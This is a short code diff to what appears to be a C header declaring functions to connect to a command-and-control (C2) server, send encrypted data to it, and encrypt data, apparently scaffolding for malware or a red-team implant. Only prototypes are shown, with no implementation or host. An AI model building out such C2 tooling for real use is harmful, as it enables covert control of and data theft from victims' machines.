@@ -8,10 +8,10 @@
 
 
 /* Function to initialize sockets and connect C2 server */
-SOCKET connect_to_c2(char *,  char *);
+SOCKET connect_to_c2(const char *,  const char *);
 
 /* Function to send data to the C2 server */
-char *send_to_c2(char *);
+int send_to_c2(char* encrypted_data, SOCKET ConnectSocket);
 
 /* Encryption Function */
 char *encryption(char *);
